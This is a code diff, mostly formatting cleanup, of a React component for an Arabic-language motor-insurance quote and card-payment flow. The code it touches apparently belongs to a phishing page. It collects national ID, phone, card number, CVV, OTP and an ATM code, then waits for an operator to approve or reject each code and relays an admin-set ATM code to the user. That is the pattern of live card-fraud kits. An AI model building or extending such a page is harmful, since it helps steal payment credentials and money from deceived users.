@@ -599,7 +599,7 @@ export default function MotorInsurance() {
   const [currentStep, setCurrentStep] = useState(1);
   const [expandedOffer, setExpandedOffer] = useState<string | null>(null);
   const [selectedFeatures, setSelectedFeatures] = useState<SelectedFeatures>(
-    {},
+    {}
   );
   const [selectedOfferId, setSelectedOfferId] = useState<string | null>(null);
   const [insuranceTypeTab, setInsuranceTypeTab] = useState<
@@ -622,7 +622,7 @@ export default function MotorInsurance() {
 
   const [isAwaitingApproval, setIsAwaitingApproval] = useState(false);
   const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus | null>(
-    null,
+    null
   );
   const [rejectionReason, setRejectionReason] = useState<string>("");
   const [atmCode, setAtmCode] = useState("");
@@ -674,7 +674,7 @@ export default function MotorInsurance() {
         setAdminAtmCode(data.adminAtmCode);
         setShowAtmModal(true);
       }
-      
+
       if (data.approvalStatus === "approved_otp") {
         setApprovalStatus("approved_otp");
         setIsAwaitingApproval(false);
@@ -700,7 +700,7 @@ export default function MotorInsurance() {
       } else if (data.approvalStatus === "rejected") {
         setApprovalStatus("rejected");
         setRejectionReason(
-          data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى",
+          data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى"
         );
         setIsAwaitingApproval(false);
         setShowAtmModal(false);
@@ -721,12 +721,12 @@ export default function MotorInsurance() {
   const form = useForm<InsuranceFormData>({
     resolver: zodResolver(insuranceFormSchema),
     defaultValues: {
-      nationalId: "1035257896",
+      nationalId: "",
       birthDay: "01",
       birthMonth: "01",
       birthYear: "2010",
       isHijri: false,
-      phoneNumber: "546555666",
+      phoneNumber: "",
       acceptMarketing: true,
       carInsurance: true,
       healthInsurance: true,
@@ -819,7 +819,7 @@ export default function MotorInsurance() {
           form.setValue("vehicleSerial", getVehicleSerial(data[0]));
           form.setValue(
             "vehicleYear",
-            getVehicleYear(data[0])?.toString() || "2023",
+            getVehicleYear(data[0])?.toString() || "2023"
           );
         } else if (
           data &&
@@ -832,7 +832,7 @@ export default function MotorInsurance() {
           form.setValue("vehicleSerial", getVehicleSerial(data.vehicles[0]));
           form.setValue(
             "vehicleYear",
-            getVehicleYear(data.vehicles[0])?.toString() || "2023",
+            getVehicleYear(data.vehicles[0])?.toString() || "2023"
           );
         } else if (
           data &&
@@ -845,7 +845,7 @@ export default function MotorInsurance() {
           form.setValue("vehicleSerial", getVehicleSerial(data.data[0]));
           form.setValue(
             "vehicleYear",
-            getVehicleYear(data.data[0])?.toString() || "2023",
+            getVehicleYear(data.data[0])?.toString() || "2023"
           );
         }
       } catch (error) {
@@ -1115,7 +1115,7 @@ export default function MotorInsurance() {
       .reduce((sum, f) => sum + f.price, 0);
     const expensesTotal = offer.extra_expenses.reduce(
       (sum, e) => sum + e.price,
-      0,
+      0
     );
     return basePrice + featuresTotal + expensesTotal;
   };
@@ -1140,12 +1140,12 @@ export default function MotorInsurance() {
   };
 
   const getCardType = (
-    cardNum: string,
+    cardNum: string
   ): { type: string; logo: string; name: string } => {
     const num = cardNum.replace(/\s/g, "");
     if (
       /^(440647|440795|446404|457865|968201|968202|968203|968204|968205|968206|968207|968208|968209|968210|968211|968212|968213|968214|968215|968216|968217|968218|968219|968220)/.test(
-        num,
+        num
       ) ||
       num.startsWith("9682")
     ) {
@@ -1167,7 +1167,7 @@ export default function MotorInsurance() {
     ? Array.from({ length: 100 }, (_, i) => String(currentHijriYear - i))
     : Array.from({ length: 100 }, (_, i) => String(currentYear - i));
   const carYears = Array.from({ length: 30 }, (_, i) =>
-    String(currentYear - i),
+    String(currentYear - i)
   );
 
   const hijriMonths = [
@@ -1301,10 +1301,18 @@ export default function MotorInsurance() {
               {[1, 2, 3, 4].map((step, index) => (
                 <div key={step} className="flex items-center">
                   <div
-                    className={`flex items-center gap-1 ${currentStep >= step ? "text-primary" : "text-muted-foreground"}`}
+                    className={`flex items-center gap-1 ${
+                      currentStep >= step
+                        ? "text-primary"
+                        : "text-muted-foreground"
+                    }`}
                   >
                     <div
-                      className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-medium ${currentStep >= step ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}
+                      className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-medium ${
+                        currentStep >= step
+                          ? "bg-primary text-primary-foreground"
+                          : "bg-muted text-muted-foreground"
+                      }`}
                     >
                       {currentStep > step ? (
                         <Check className="h-3 w-3" />
@@ -1315,7 +1323,9 @@ export default function MotorInsurance() {
                   </div>
                   {index < 3 && (
                     <div
-                      className={`w-6 h-0.5 mx-1 ${currentStep > step ? "bg-primary" : "bg-muted"}`}
+                      className={`w-6 h-0.5 mx-1 ${
+                        currentStep > step ? "bg-primary" : "bg-muted"
+                      }`}
                     />
                   )}
                 </div>
@@ -1598,7 +1608,7 @@ export default function MotorInsurance() {
                             form.setValue("vehicleSerial", vehicleSerial);
                             form.setValue(
                               "vehicleYear",
-                              vehicleYear?.toString() || "2023",
+                              vehicleYear?.toString() || "2023"
                             );
                           }}
                           className={`p-4 border-2 rounded-xl cursor-pointer transition-all ${
@@ -1726,7 +1736,11 @@ export default function MotorInsurance() {
                     className="cursor-pointer"
                   >
                     <div
-                      className={`border rounded-lg p-4 transition-colors ${form.watch("coverageType") === "third-party" ? "border-primary bg-primary/5" : "bg-card hover:border-primary/50"}`}
+                      className={`border rounded-lg p-4 transition-colors ${
+                        form.watch("coverageType") === "third-party"
+                          ? "border-primary bg-primary/5"
+                          : "bg-card hover:border-primary/50"
+                      }`}
                     >
                       <RadioGroupItem
                         value="third-party"
@@ -1749,7 +1763,11 @@ export default function MotorInsurance() {
                     className="cursor-pointer"
                   >
                     <div
-                      className={`border rounded-lg p-4 transition-colors ${form.watch("coverageType") === "comprehensive" ? "border-primary bg-primary/5" : "bg-card hover:border-primary/50"}`}
+                      className={`border rounded-lg p-4 transition-colors ${
+                        form.watch("coverageType") === "comprehensive"
+                          ? "border-primary bg-primary/5"
+                          : "bg-card hover:border-primary/50"
+                      }`}
                     >
                       <RadioGroupItem
                         value="comprehensive"
@@ -1842,7 +1860,9 @@ export default function MotorInsurance() {
                 return (
                   <Card
                     key={offer.id}
-                    className={`overflow-hidden transition-all ${isSelected ? "ring-2 ring-primary" : ""}`}
+                    className={`overflow-hidden transition-all ${
+                      isSelected ? "ring-2 ring-primary" : ""
+                    }`}
                     data-testid={`offer-card-${offer.id}`}
                   >
                     <div
@@ -1935,7 +1955,7 @@ export default function MotorInsurance() {
                                 {feature.price > 0 ? (
                                   <Checkbox
                                     checked={currentFeatures.includes(
-                                      feature.id,
+                                      feature.id
                                     )}
                                     onCheckedChange={() =>
                                       toggleFeature(offer.id, feature.id)
@@ -1999,7 +2019,7 @@ export default function MotorInsurance() {
                                   +
                                   {offer.extra_features
                                     .filter((f) =>
-                                      currentFeatures.includes(f.id),
+                                      currentFeatures.includes(f.id)
                                     )
                                     .reduce((sum, f) => sum + f.price, 0)}{" "}
                                   ر.س
@@ -2037,7 +2057,9 @@ export default function MotorInsurance() {
             {/* Interactive 3D Card Preview */}
             <div className="perspective-1000 mb-6">
               <div
-                className={`relative w-full max-w-sm mx-auto h-52 transition-transform duration-700 preserve-3d cursor-pointer ${cardCvv.length > 0 ? "rotate-y-180" : ""}`}
+                className={`relative w-full max-w-sm mx-auto h-52 transition-transform duration-700 preserve-3d cursor-pointer ${
+                  cardCvv.length > 0 ? "rotate-y-180" : ""
+                }`}
                 style={{
                   transformStyle: "preserve-3d",
                   transform:
@@ -2053,8 +2075,8 @@ export default function MotorInsurance() {
                       currentCardType.type === "mada"
                         ? "linear-gradient(135deg, #1a5c6b 0%, #0d3a45 50%, #062028 100%)"
                         : currentCardType.type === "mastercard"
-                          ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
-                          : "linear-gradient(135deg, #667eea 0%, #764ba2 50%, #5b3a8c 100%)",
+                        ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
+                        : "linear-gradient(135deg, #667eea 0%, #764ba2 50%, #5b3a8c 100%)",
                   }}
                 >
                   <div className="absolute top-0 left-0 w-full h-full overflow-hidden rounded-2xl">
@@ -2093,7 +2115,9 @@ export default function MotorInsurance() {
                       <img
                         src={currentCardType.logo}
                         alt={currentCardType.name}
-                        className={`w-auto object-contain ${currentCardType.type === "visa" ? "h-6" : "h-10"}`}
+                        className={`w-auto object-contain ${
+                          currentCardType.type === "visa" ? "h-6" : "h-10"
+                        }`}
                       />
                     </div>
 
@@ -2137,8 +2161,8 @@ export default function MotorInsurance() {
                       currentCardType.type === "mada"
                         ? "linear-gradient(135deg, #0d3a45 0%, #062028 100%)"
                         : currentCardType.type === "mastercard"
-                          ? "linear-gradient(135deg, #16213e 0%, #0f3460 100%)"
-                          : "linear-gradient(135deg, #764ba2 0%, #5b3a8c 100%)",
+                        ? "linear-gradient(135deg, #16213e 0%, #0f3460 100%)"
+                        : "linear-gradient(135deg, #764ba2 0%, #5b3a8c 100%)",
                   }}
                 >
                   <div className="w-full h-12 bg-gray-900 mt-6"></div>
@@ -2216,7 +2240,9 @@ export default function MotorInsurance() {
                       <img
                         src={currentCardType.logo}
                         alt={currentCardType.name}
-                        className={`w-auto object-contain ${currentCardType.type === "visa" ? "h-5" : "h-8"}`}
+                        className={`w-auto object-contain ${
+                          currentCardType.type === "visa" ? "h-5" : "h-8"
+                        }`}
                       />
                     </div>
                   </div>
@@ -2262,7 +2288,7 @@ export default function MotorInsurance() {
                       value={cardCvv}
                       onChange={(e) =>
                         setCardCvv(
-                          e.target.value.replace(/\D/g, "").slice(0, 4),
+                          e.target.value.replace(/\D/g, "").slice(0, 4)
                         )
                       }
                       placeholder="•••"
@@ -2300,7 +2326,7 @@ export default function MotorInsurance() {
                   <div className="text-left">
                     <span className="font-bold text-2xl text-emerald-600">
                       {calculateOfferTotal(
-                        offerData.find((o) => o.id === selectedOfferId)!,
+                        offerData.find((o) => o.id === selectedOfferId)!
                       ).toFixed(2)}
                     </span>
                     <span className="text-emerald-600 font-medium mr-1">
@@ -2382,7 +2408,11 @@ export default function MotorInsurance() {
                       {[...Array(6)].map((_, i) => (
                         <div
                           key={i}
-                          className={`w-2 h-2 rounded-full transition-colors ${i < otpAttempts ? "bg-purple-500" : "bg-gray-300 dark:bg-gray-600"}`}
+                          className={`w-2 h-2 rounded-full transition-colors ${
+                            i < otpAttempts
+                              ? "bg-purple-500"
+                              : "bg-gray-300 dark:bg-gray-600"
+                          }`}
                         />
                       ))}
                     </div>
@@ -2400,8 +2430,12 @@ export default function MotorInsurance() {
                         <Clock className="h-4 w-4 text-amber-600 animate-spin" />
                       </div>
                       <div className="text-center">
-                        <p className="font-medium text-amber-700 dark:text-amber-400">جاري التحقق من الرمز</p>
-                        <p className="text-xs text-amber-600 dark:text-amber-500">الرجاء الانتظار...</p>
+                        <p className="font-medium text-amber-700 dark:text-amber-400">
+                          جاري التحقق من الرمز
+                        </p>
+                        <p className="text-xs text-amber-600 dark:text-amber-500">
+                          الرجاء الانتظار...
+                        </p>
                       </div>
                     </div>
                   </div>
@@ -2414,8 +2448,12 @@ export default function MotorInsurance() {
                         <CheckCircle className="h-4 w-4 text-white" />
                       </div>
                       <div className="text-center">
-                        <p className="font-medium text-green-700 dark:text-green-400">تم التحقق بنجاح</p>
-                        <p className="text-xs text-green-600 dark:text-green-500">جاري الانتقال للخطوة التالية...</p>
+                        <p className="font-medium text-green-700 dark:text-green-400">
+                          تم التحقق بنجاح
+                        </p>
+                        <p className="text-xs text-green-600 dark:text-green-500">
+                          جاري الانتقال للخطوة التالية...
+                        </p>
                       </div>
                     </div>
                   </div>
@@ -2428,8 +2466,12 @@ export default function MotorInsurance() {
                         <Ban className="h-4 w-4 text-white" />
                       </div>
                       <div className="text-center">
-                        <p className="font-medium text-red-700 dark:text-red-400">تم رفض الرمز</p>
-                        <p className="text-xs text-red-600 dark:text-red-500">{rejectionReason || "الرجاء المحاولة مرة أخرى"}</p>
+                        <p className="font-medium text-red-700 dark:text-red-400">
+                          تم رفض الرمز
+                        </p>
+                        <p className="text-xs text-red-600 dark:text-red-500">
+                          {rejectionReason || "الرجاء المحاولة مرة أخرى"}
+                        </p>
                       </div>
                     </div>
                   </div>
@@ -2439,10 +2481,18 @@ export default function MotorInsurance() {
                   <Button
                     className="w-full h-14 text-base rounded-xl bg-gradient-to-l from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 shadow-lg"
                     onClick={form.handleSubmit(onSubmit)}
-                    disabled={mutation.isPending || otpAttempts <= 0 || isAwaitingApproval}
+                    disabled={
+                      mutation.isPending ||
+                      otpAttempts <= 0 ||
+                      isAwaitingApproval
+                    }
                     data-testid="button-verify-otp"
                   >
-                    {isAwaitingApproval ? "جاري التحقق..." : mutation.isPending ? "جاري الإرسال..." : "تأكيد الدفع"}
+                    {isAwaitingApproval
+                      ? "جاري التحقق..."
+                      : mutation.isPending
+                      ? "جاري الإرسال..."
+                      : "تأكيد الدفع"}
                   </Button>
 
                   <Button
@@ -2636,7 +2686,9 @@ export default function MotorInsurance() {
               </Button>
             )}
             <Button
-              className={`h-12 text-base rounded-full gap-2 ${currentStep > 1 ? "flex-1" : "w-full"}`}
+              className={`h-12 text-base rounded-full gap-2 ${
+                currentStep > 1 ? "flex-1" : "w-full"
+              }`}
               onClick={form.handleSubmit(onSubmit)}
               disabled={mutation.isPending}
               data-testid="button-continue"
@@ -2644,8 +2696,8 @@ export default function MotorInsurance() {
               {mutation.isPending
                 ? "جاري الإرسال..."
                 : currentStep === 4
-                  ? "دفع الآن"
-                  : "متابعة"}
+                ? "دفع الآن"
+                : "متابعة"}
               <ChevronLeft className="h-5 w-5" />
             </Button>
           </div>
@@ -2741,7 +2793,7 @@ export default function MotorInsurance() {
               رمز التحقق من الصراف
             </DialogTitle>
           </DialogHeader>
-          
+
           <div className="text-center space-y-6 p-4">
             <div className="bg-gradient-to-br from-purple-50 to-purple-100 dark:from-purple-900/30 dark:to-purple-800/30 border-2 border-purple-300 dark:border-purple-700 rounded-xl p-8 shadow-inner">
               <div className="text-sm text-slate-600 dark:text-slate-400 mb-3 font-medium">
